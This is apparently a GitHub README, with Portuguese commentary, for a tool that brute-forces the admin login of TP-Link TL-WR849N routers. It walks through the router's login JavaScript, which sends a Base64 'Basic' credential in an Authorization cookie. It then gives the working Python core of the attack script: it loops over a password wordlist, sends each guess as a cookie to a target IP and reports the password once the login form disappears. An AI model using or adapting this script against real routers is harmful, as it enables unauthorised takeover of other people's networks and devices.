<h1 align="center">Tools Router Brute</h1>

<p align="center">Tool to perform brute force attack on TPLink routers</p>

<table border="0">
    <tr>
      <td><img src="https://github.com/WalderlanSena/toolsrouterbrute/blob/master/img/model1.jpg" width="9000"></td>  
      <td>
        <h2 align="center">Modelo Roteador Wireless N 300Mbps
TL-WR849N</h2>
        <p>
          <ul align="justify">
            <li>Velocidade wireless de 300Mbps ideal para aplicações sensíveis a interrupções, como streaming de vídeo em HD</li>
            <li>Fácil configuração da criptografia de segurança da rede wireless com um simples toque no botão WPS Controle de banda baseado em IP permite aos administradores determinarem que largura de banda será alocada para cada computador</li>
            <li>WDS wireless bridge fornece perfeita ponte para expandir a rede wireless</li>
          </ul>
        </p>
      </td>
    </tr>
</table>

<h2>Funcionamento da Autenticação do TP-Link - TL-WR849N</h2>

 - Capturando url atual e subscrevendo o valor para o link definido no replace e redirecionando o usúario.
 - Criando uma variavél isLocker e atribuindo o valor false a mesma.
 - Deletando o cookie Authorization, vulgo responsável pela a autenticação.
 
```javascript
var url = window.location.href;

if (url.indexOf("tplinklogin.net") >= 0)
{
    url = url.replace("tplinklogin.net", "tplinkwifi.net");
    window.location = url;
}

var isLocked = false;

deleteCookie("Authorization");
```

<h3>Função responsável implementar a hash base64, que é utilizada para setar o Cookie de autenticação.</h3>

```javascript

function Base64Encoding(input) 
{
	var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
	var output = "";
	var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
	var i = 0;
	input = utf8_encode(input);
	while (i < input.length) 
	{
		chr1 = input.charCodeAt(i++);
		chr2 = input.charCodeAt(i++);
		chr3 = input.charCodeAt(i++);
		enc1 = chr1 >> 2;
		enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
		enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
		enc4 = chr3 & 63;
		
		if (isNaN(chr2)) 
		{
			enc3 = enc4 = 64;
		} 
		else if (isNaN(chr3)) 
		{
			enc4 = 64;
		}
		output = output + keyStr.charAt(enc1) + keyStr.charAt(enc2) + keyStr.charAt(enc3) + keyStr.charAt(enc4);
	}
	return output;
}
```

### Função que monitora o clique de login e captura os dados informado pelo usúario

```javascript

function PCWin(event)
{
	if (event.keyCode == 13)
	{
		PCSubWin();
	}
}

function PCSubWin()
{	
    // Verifica se o usúario não está bloqueado por alguns segundos
    if (isLocked == true)
     {
	return;
     }
    // Criando uma variavel que receberá o base64 referente a autenticação
    // E criando duas variavels para receber o userName e o password
    var auth;
    var password = $("pcPassword").value;
    var userName = $("userName").value;
    
    // Concatena a palavra "Basic" com a hash base64 de userName com ":" e o password
    auth = "Basic "+Base64Encoding(userName+":"+password);
    // Atribui o valor ao Cookie do navegador com a chave Authorization e com o auth como conteúdo
    document.cookie = "Authorization=" + auth;
    // Recarrega a página
    window.location.reload();
}

```

### Entendendo o funcionamento do script trb.py

```python

def main():
    wordlist = open(sys.argv[3], 'r')
    count = 0
    for i in wordlist:

        login = str(sys.argv[1])
        senha = i.rstrip()
        auth  = "Basic "

        authEncode = auth+base64.b64encode(login+':'+senha)

        cookie = {"Authorization": authEncode}

        response = r.get('http://'+sys.argv[2], cookies=cookie)

        if response.content.count('id="userName"') != 1:
            os.system('setterm -cursor on')
            print('\n\tPassword Found =====> ' + senha)
            exit(0)
        else:
            os.system("clear")
            splash()
            count = count + 1
            print('\t[ '+ str(count) + ' ] Password not found ===> ' + senha)	    
```
